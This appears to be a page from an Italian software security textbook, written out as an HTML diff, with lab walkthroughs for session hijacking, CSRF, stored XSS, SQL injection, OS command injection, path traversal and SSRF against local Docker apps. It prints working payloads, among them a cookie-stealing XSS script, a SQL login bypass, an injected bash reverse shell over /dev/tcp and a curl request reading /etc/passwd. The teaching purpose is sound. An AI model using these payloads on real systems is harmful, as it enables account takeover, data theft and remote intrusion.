@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="it" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://swsec-book.github.io/examples/web-vulns/">
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>Web Application Vulnerabilities - Software Security Book</title>
+        <link href="../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../../css/brands.min.css" rel="stylesheet">
+        <link href="../../css/solid.min.css" rel="stylesheet">
+        <link href="../../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
+        <link id="hljs-light" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" >
+        <link id="hljs-dark" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github-dark.min.css" disabled>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+        <script>hljs.highlightAll();</script>
+        <script async src="https://www.googletagmanager.com/gtag/js?id=G-8JQY0C31BY"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+
+          gtag('config', "G-8JQY0C31BY");
+        </script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../..">Software Security Book</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../.." class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../../setup/" class="nav-link">Setup</a>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle active" aria-current="page" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Examples</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../mem-mgmt-vulns/" class="dropdown-item">Memory Management Vulnerabilities</a>
+</li>
+                                    
+<li>
+    <a href="./" class="dropdown-item active" aria-current="page">Web Application Vulnerabilities</a>
+</li>
+                                    
+<li>
+    <a href="../llm-vulns/" class="dropdown-item">LLM-based Application Vulnerabilities</a>
+</li>
+                                    
+<li>
+    <a href="../fuzzing/" class="dropdown-item">Fuzzing</a>
+</li>
+                                    
+<li>
+    <a href="../static-analysis/" class="dropdown-item">Static Analysis</a>
+</li>
+                                </ul>
+                            </li>
+                            <li class="nav-item dropdown">
+                                <a href="#" class="nav-link dropdown-toggle" role="button" data-bs-toggle="dropdown"  aria-expanded="false">Exercises</a>
+                                <ul class="dropdown-menu">
+                                    
+<li>
+    <a href="../../exercises/mem-mgmt-vulns/" class="dropdown-item">Memory Management Vulnerabilities</a>
+</li>
+                                    
+<li>
+    <a href="../../exercises/web-vulns/" class="dropdown-item">Web Application Vulnerabilities</a>
+</li>
+                                    
+<li>
+    <a href="../../exercises/llm-vulns/" class="dropdown-item">LLM-based Application Vulnerabilities</a>
+</li>
+                                    
+<li>
+    <a href="../../exercises/fuzzing/" class="dropdown-item">Fuzzing</a>
+</li>
+                                    
+<li>
+    <a href="../../exercises/static-analysis/" class="dropdown-item">Static Analysis</a>
+</li>
+                                </ul>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a rel="prev" href="../mem-mgmt-vulns/" class="nav-link">
+                                    <i class="fa fa-arrow-left"></i> Previous
+                                </a>
+                            </li>
+                            <li class="nav-item">
+                                <a rel="next" href="../llm-vulns/" class="nav-link">
+                                    Next <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#web-application-vulnerabilities" class="nav-link">Web Application Vulnerabilities</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#session-hijacking" class="nav-link">Session Hijacking</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#csrf" class="nav-link">Cross-Site Request Forgery (CSRF)</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#xss" class="nav-link">Cross Site Scripting (XSS)</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#sql-injection" class="nav-link">SQL injection</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#os-command-injection" class="nav-link">OS command injection</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#path-traversal" class="nav-link">Path traversal</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#ssrf" class="nav-link">Server-Side Request Forgery (SSRF)</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="web-application-vulnerabilities">Web Application Vulnerabilities</h1>
+<p>I seguenti esempi sono disponibile nella macchina virtuale nella cartella <code>swsec-labs/web-security/</code>, e nel repository online su <a href="https://github.com/swsec-book/swsec-labs">https://github.com/swsec-book/swsec-labs</a>.</p>
+<h2 id="session-hijacking">Session Hijacking</h2>
+<p>Il seguente esempio mostra un caso di attacco di tipo <strong>session hijacking</strong>. Il programma è nella sotto-cartella <code>swsec-labs/web-security/session-hijacking</code> della macchina virtuale.</p>
+<p>Se un utente subisce il furto dei suoi <em>cookie</em>, un attaccante può impersonarlo nell'accedere ad un sito web.</p>
+<p><img alt="Session hijacking" src="../../img/web-vulns/session-hijacking.png" /></p>
+<p>Per simulare l'attacco, avviate l'applicazione web vulnerabile.</p>
+<pre><code>$ cd session-hijacking
+$ docker compose build
+$ docker compose up -d
+</code></pre>
+<p>Aprite una prima finestra del browser, che avrà il ruolo di <strong>utente vittima</strong>.</p>
+<ol>
+<li>Visitate il sito <a href="http://localhost">http://localhost</a>.</li>
+<li>Il sito web mostra, per comodità, il token di sessione (<em>session ID</em>) che è stato assegnato all'utente vittima, e che è stato salvato in un cookie.</li>
+<li>Fate il login con username <code>admin</code> e password <code>admin</code>. Da questo momento, la sessione consente l'accesso ad una ipotetica pagina di amministrazione del sito.</li>
+</ol>
+<p>Aprite una seconda finestra del browser in modalità <strong>incognito</strong>, che avrà il ruolo di <strong>attaccante</strong>. La modalità incognito permette di separare la sessione dell'utente vittima da quella dell'attaccante, in modo da simulare uno scenario realistico.</p>
+<ol>
+<li>Visitate il sito <a href="http://localhost">http://localhost</a>.</li>
+<li>Aprite gli <em>strumenti sviluppatore</em> forniti dal browser, e ispezionate il contenuto del cookie <code>PHPSESSID</code>.</li>
+<li>Modificate il contenuto del cookie <code>PHPSESSID</code>, effettuando un copia-incolla del token di sessione dalla finestra dell'utente vittima. Questa operazione simula il furto di cookie da parte dell'attaccante (ad esempio, tramite tecniche di <em>information stealing</em>).</li>
+<li>Ricaricate la pagina. Da questo momento, anche la finestra dell'attaccante ha accesso alla pagina di amministrazione del sito.</li>
+</ol>
+<p>Con la stessa applicazione dimostrativa, è anche possibile effettuare una variante dell'attacco, detta <strong>session fixation</strong>.</p>
+<p>Aprite una prima finestra del browser in modalità <strong>incognito</strong>, che avrà il ruolo di <strong>attaccante</strong>, e una secondo finestra del browser che avrà il ruolo di <strong>utente vittima</strong>.</p>
+<ol>
+<li>Nel browser dell'attaccante, visitate il sito <a href="http://localhost">http://localhost</a>.</li>
+<li>Prendete nota del session ID, per creare lo URL <a href="http://localhost?PHPSESSID=abcde">http://localhost?PHPSESSID=abcde</a>, sostituendo il valore del session ID nello URL.</li>
+<li>Fate copia-incolla dello URL nella finestra dell'utente vittima per visitare il sito web. La variabile <code>PHPSESSID</code> nello URL forza la sessione dell'utente vittima ad usare lo stesso session ID che è stato creato dall'attaccante. Da questo momento, attaccante e vittima condividono lo stesso token.</li>
+<li>Nella finestra dell'utente vittima, effettuate il login con username <code>admin</code> e password <code>admin</code>.</li>
+<li>Nella finestra dell'attaccante, ricaricate la pagina senza fare il login. L'attaccante avrà comunque accesso alla pagina di amministrazione del sito.</li>
+</ol>
+<p>Per chiudere l'applicazione, utilizzate questo comando.</p>
+<pre><code>$ docker compose down
+</code></pre>
+<h2 id="csrf">Cross-Site Request Forgery (CSRF)</h2>
+<p>Il seguente esempio mostra un caso di attacco di tipo <strong>CSRF</strong>, su una versione vulnerabile della applicazione web <em>Elgg</em> che simula un social network. L'esempio è tratto da <a href="https://seedsecuritylabs.org/">https://seedsecuritylabs.org/</a>. </p>
+<p>Il programma è nella sotto-cartella <code>swsec-labs/web-security/csrf-elgg</code> (per gli utenti di sistemi x86) oppure <code>swsec-labs/web-security/csrf-elgg-arm</code> (per gli utenti di sistemi Apple). </p>
+<p><img alt="Elgg login" src="../../img/web-vulns/elgg-login-page.png" /></p>
+<p>In questo attacco, l'attaccante è rappresentato dall'utente <strong>Samy</strong> del social network, e la vittima è rappresentata dall'utente <strong>Alice</strong>. Inoltre, l'attaccante dispone di un ulteriore utente <strong>Charlie</strong> sul social network, ai fini di analizzare il funzionamento del sito.</p>
+<p>In questo attacco, Samy induce Alice a visitare una pagina web malevola (ad esempio, tramite social engineering). La pagina malevola invierà una richiesta cross-site malevola al social network, impersonando l'utente Alice. A seguito della richiesta, Samy sarà stato aggiunto alla cerchia degli "amici" di Alice, ad insaputa di Alice.</p>
+<p>Avviate la applicazione Elgg.</p>
+<pre><code>$ cd csrf-elgg
+$ docker compose build
+$ docker compose up -d
+</code></pre>
+<p>Aprite una prima finestra del browser, che avrà il ruolo di <strong>utente vittima</strong>.</p>
+<ol>
+<li>Visitate il sito <a href="http://www.seed-server.com">http://www.seed-server.com</a>.</li>
+<li>Effettuate il login con username <code>alice</code> e password <code>seedalice</code>.</li>
+<li>Visitate la pagina <em>Friends</em> del sito. Inizialmente, la lista degli amici di Alice è vuota.</li>
+<li>Lasciate la pagina aperta, senza effettuare il logout.</li>
+</ol>
+<p>Aprite una seconda finestra del browser in modalità <strong>incognito</strong>, che avrà il ruolo di <strong>attaccante</strong>.</p>
+<ol>
+<li>Visitate il sito <a href="http://www.seed-server.com">http://www.seed-server.com</a>.</li>
+<li>Effettuate il login con username <code>charlie</code> e password <code>seedcharlie</code>.</li>
+<li>Visitate la pagina <em>Members</em> del sito, e poi il profilo dell'utente Samy. Prendete nota dello URL collegato al tasto <em>Add Friend</em>. Lo URL è del tipo <em>http://www.seed-server.com/action/friends/add?friend=42...</em>, dove il valore 42 rappresenta l'utente Samy.</li>
+<li>All'interno della cartella del codice dell'esempio, nella sotto-cartella <code>attacker</code>, modificate <code>addfriend.html</code> come segue. Modificare il valore 42 se necessario.</li>
+</ol>
+<pre><code>&lt;script&gt;
+window.onload = function(){
+
+  // Create a &lt;form&gt; element
+  var p = document.createElement(&quot;form&quot;);
+  p.action = &quot;http://www.seed-server.com/action/friends/add&quot;;
+  p.method = &quot;get&quot;;
+
+  // The attack fills the form with the &quot;friend&quot; parameter
+  // The fields are hidden, the victim will not see them.
+
+  p.innerHTML = &quot;&lt;input type='hidden' name='friend' value='42'&gt;&quot;;
+
+  // Append the form to the current page
+  document.body.appendChild(p);
+
+  // Submit the form
+  p.submit();
+}
+&lt;/script&gt;
+</code></pre>
+<p>Nella finestra dell'utente vittima (la prima che avete aperto ossia, quella dell'utente Alice).</p>
+<ol>
+<li>Visitate il sito <a href="http://www.attacker32.com/">http://www.attacker32.com/</a> in una tab separata del browser.</li>
+<li>Aprite di nuovo <a href="http://www.seed-server.com">http://www.seed-server.com</a>. Non è necessario ripetere il login.</li>
+<li>Visitate di nuovo la pagina <em>Friends</em> del sito. Se l'attacco ha avuto successo, l'utente Samy appare nella lista degli amici di Alice.</li>
+</ol>
+<p>Per chiudere l'applicazione, utilizzate i seguenti comandi.</p>
+<pre><code>$ docker compose down
+$ docker container prune
+$ docker network prune
+</code></pre>
+<h2 id="xss">Cross Site Scripting (XSS)</h2>
+<p>Il seguente esempio mostra un caso di attacco di tipo <strong>Stored XSS</strong>, su una versione vulnerabile della applicazione web <em>Elgg</em> che simula un social network. L'esempio è tratto da <a href="https://seedsecuritylabs.org/">https://seedsecuritylabs.org/</a>.</p>
+<p>Il programma è nella sotto-cartella <code>swsec-labs/web-security/xss-elgg</code> (per gli utenti di sistemi x86) oppure <code>swsec-labs/web-security/xss-elgg-arm</code> (per gli utenti di sistemi Apple). </p>
+<p>In questo esempio, l'utente Samy inserisce del codice Javascript nella sua biografia del social network. Quando l'utente Alice visita la biografia di Samy, il codice Javascript viene eseguito nel browser di Alice. Il codice può accedere ai cookie di Alice (consentendo ad esempio il furto di cookie), può effettuare richieste HTTP per conto di Alice, può tracciare gli eventi nel browser quando Alice interagisce con la pagina, e può modificare il contenuto della pagina visualizzato da Alice.</p>
+<p>Avviate la applicazione Elgg.</p>
+<pre><code>$ cd xss-elgg
+$ docker compose build
+$ docker compose up -d
+</code></pre>
+<p>Aprite una prima finestra del browser in modalità <strong>incognito</strong>, che avrà il ruolo di <strong>attaccante</strong>.</p>
+<ol>
+<li>Visitate il sito <a href="http://www.seed-server.com">http://www.seed-server.com</a>.</li>
+<li>Effettuate il login con username <code>samy</code> e password <code>seedsamy</code>.</li>
+<li>Visitate la pagina <em>Edit profile</em>.</li>
+<li>Vicino alla casella di testo intitolata <em>About me</em>, clickate sul link <em>edit HTML</em>. In questo modo, il testo inserito nella casella verrà inviato al server senza modifiche per la formattazione grafica.</li>
+<li>Inserite del codice Javascript nella casella di testo <em>About me</em>. Ad esempio, è possibile fare una prova inserendo il codice <code>&lt;script&gt;alert('XSS');&lt;/script&gt;</code>.</li>
+</ol>
+<p><img alt="XSS edit HTML" src="../../img/web-vulns/xss-edit-html.png" /></p>
+<p><img alt="XSS about me" src="../../img/web-vulns/xss-about-me.png" /></p>
+<p>Aprite una seconda finestra del browser, che avrà il ruolo di <strong>utente vittima</strong>.</p>
+<ol>
+<li>Visitate il sito <a href="http://www.seed-server.com">http://www.seed-server.com</a>.</li>
+<li>Effettuate il login con username <code>alice</code> e password <code>seedalice</code>.</li>
+<li>Visitate la pagina <em>Members</em> del sito, e poi il profilo dell'utente Samy.</li>
+<li>Il codice Javascript sarà eseguito dal browser. Nel caso dell'esempio precedente, verrà visualizzato un popup con il messaggio <em>XSS</em>.</li>
+</ol>
+<p>Per simulare il furto di cookie, è possibile sostituire il codice Javascript precedente con il codice seguente.</p>
+<pre><code>&lt;script&gt;
+   document.write('&lt;img src=http://127.0.0.1:5555?c=' + escape(document.cookie) + ' &gt;');
+&lt;/script&gt;
+</code></pre>
+<p>Per eseguire l'attacco:</p>
+<ol>
+<li>Avviate da un'altra finestra di terminale il tool netcat con il comando <code>nc -lknv 5555</code>. Il tool rimane in ascolto di connessioni.</li>
+<li>Nella finestra dell'utente Alice, ripetete le stesse operazioni precedenti.</li>
+<li>Il tool netcat riceverà una richiesta HTTP, contenente nello URL il contenuto dei cookie di Alice.</li>
+</ol>
+<p>Per chiudere l'applicazione, utilizzate i seguenti comandi.</p>
+<pre><code>$ docker compose down
+$ docker container prune
+$ docker network prune
+</code></pre>
+<h2 id="sql-injection">SQL injection</h2>
+<p>Il seguente esempio mostra un caso di attacco di tipo <strong>SQL Injection</strong> su una semplice applicazione web con un database, contenente i dati privati degli impiegati di una azienda. L'esempio è tratto da <a href="https://seedsecuritylabs.org/">https://seedsecuritylabs.org/</a>.</p>
+<p>Il programma è nella sotto-cartella <code>swsec-labs/web-security/sql-injection</code> (per gli utenti di sistemi x86) oppure <code>swsec-labs/web-security/sql-injection-arm</code> (per gli utenti di sistemi Apple). </p>
+<p>Per avviare la applicazione, usare i seguenti comandi.</p>
+<pre><code>$ cd sql-injection
+$ docker compose build
+$ docker compose up -d
+</code></pre>
+<p>Di seguito è riportata la struttura della tabella nel database, e il codice PHP con la query SQL vulnerabile all'attacco di SQL injection.</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>ID</th>
+<th>Password</th>
+<th>Salary</th>
+<th>Birthday</th>
+<th>SSN</th>
+<th>Nickname</th>
+<th>Email</th>
+<th>Address</th>
+<th>PhoneNumber</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Admin</td>
+<td>99999</td>
+<td>seedadmin</td>
+<td>400000</td>
+<td>3/5</td>
+<td>43254314</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Alice</td>
+<td>10000</td>
+<td>seedalice</td>
+<td>20000</td>
+<td>9/20</td>
+<td>10211002</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Boby</td>
+<td>20000</td>
+<td>seedboby</td>
+<td>50000</td>
+<td>4/20</td>
+<td>10213352</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Ryan</td>
+<td>30000</td>
+<td>seedryan</td>
+<td>90000</td>
+<td>4/10</td>
+<td>32193525</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Samy</td>
+<td>40000</td>
+<td>seedsamy</td>
+<td>40000</td>
+<td>1/11</td>
+<td>32111111</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Ted</td>
+<td>50000</td>
+<td>seedted</td>
+<td>110000</td>
+<td>11/3</td>
+<td>24343244</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<pre><code>$input_uname = $_GET['username'];
+$input_pwd = $_GET['password'];
+$hashed_pwd = sha1($input_pwd);
+
+$sql = &quot;SELECT id, name, edit, salary, birth, ssn, address, email, nickname, password
+        FROM credential
+        WHERE name='$input_uname' and password='$hashed_pwd'&quot;;
+
+$result = $conn-&gt;query($sql);
+</code></pre>
+<p>È possibile effettuare il login come amministratore, anche senza conoscerne la password, inserendo nel campo <em>username</em> del form di login la stringa <code>Admin';#</code> (includendo i caratteri speciali dopo la parola <em>Admin</em>). La stringa nel campo <em>password</em> è indifferente per l'attacco.</p>
+<p>Per chiudere l'applicazione, utilizzate i seguenti comandi.</p>
+<pre><code>$ docker compose down
+$ docker container prune
+$ docker network prune
+</code></pre>
+<h2 id="os-command-injection">OS command injection</h2>
+<p>Questo programma di esempio mostra una vulnerabilità di <strong>OS Command Injection</strong>.</p>
+<p>Il programma è disponibile nella sotto-cartella <code>swsec-labs/web-security/os-injection</code> della macchina virtuale.</p>
+<p>Il programma contiene la seguente istruzione vulnerabile.</p>
+<pre><code>system(&quot;ping -c 3 &quot;.$_GET['host'], $result_code);
+</code></pre>
+<p>Per avviare il programma, utilizzare i seguenti comandi.</p>
+<pre><code>cd os-injection
+php -S localhost:8000
+</code></pre>
+<p>Si può sfruttare la vulnerabilità per creare una reverse shell.</p>
+<ol>
+<li>In una nuova finestra di terminale, lanciare il tool netcat in ascolto di connessioni, con il comando <code>nc -lv 12345</code>.</li>
+<li>Nel form della pagina web <a href="http://localhost:8000">http://localhost:8000</a>, inserire nel campo <em>hostname</em> del form la stringa <code>example.com; bash -c 'bash -i &gt;/dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1'</code>. Il secondo comando all'interno della stringa usa la shell <em>bash</em> per redirigere l'I/O della shell verso una connessione TCP. </li>
+</ol>
+<h2 id="path-traversal">Path traversal</h2>
+<p>Il seguente esempio mostra un caso di attacco di tipo <strong>path traversal</strong> su una semplice applicazione web in Python. L'applicazione mostra un elenco di utenti. Clickando sul nome di un utente, viene visitata una pagina al percorso indicato nel parametro dello URL.</p>
+<p>Il programma è disponibile nella sotto-cartella <code>swsec-labs/web-security/path-traversal</code> della macchina virtuale.</p>
+<p>Per eseguire l'applicazione:</p>
+<pre><code>$ python3 -m venv env
+$ source env/bin/activate
+$ pip3 install flask
+$ pip3 install requests
+
+$ export FLASK_RUN_PORT=8080
+$ flask --app meetr.py run
+</code></pre>
+<p>È possibile innescare la vulnerabilità con il seguente comando.</p>
+<pre><code>$ curl -s &quot;http://localhost:8080/profile?image=../../../../../../etc/passwd&quot;
+</code></pre>
+<p>Se necessario, aggiungere ulteriori frammenti di percorso "../" nel parametro.</p>
+<h2 id="ssrf">Server-Side Request Forgery (SSRF)</h2>
+<p>Il seguente esempio mostra un caso di attacco di tipo <strong>SSRF</strong> su una semplice applicazione web in Python. L'applicazione permette di caricare una immagine da un URL, da indicare in un form.</p>
+<p>Il programma è disponibile nella sotto-cartella <code>swsec-labs/web-security/ssrf</code> della macchina virtuale.</p>
+<p>Per eseguire l'applicazione:</p>
+<pre><code>$ python3 -m venv env
+$ source env/bin/activate
+$ pip3 install flask
+$ pip3 install requests
+
+$ export FLASK_RUN_PORT=8080
+$ flask --app meetr.py run
+</code></pre>
+<p>È possibile innescare la vulnerabilità con i seguenti comandi (si genera una richiesta web verso <code>example.org</code>).</p>
+<pre><code>$ curl -s &quot;http://localhost:8080/pfp?url=http%3A%2F%2Fexample.org&quot;
+$ curl -s &quot;http://localhost:8080/profile.png&quot;
+...
+    &lt;h1&gt;Example Domain&lt;/h1&gt;
+    &lt;p&gt;This domain is for use in illustrative examples in documents. You may use this
+    domain in literature without prior coordination or asking for permission.&lt;/p&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.iana.org/domains/example&quot;&gt;More information...&lt;/a&gt;&lt;/p&gt;
+...
+</code></pre></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../js/base.js"></script>
+        <script src="../../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
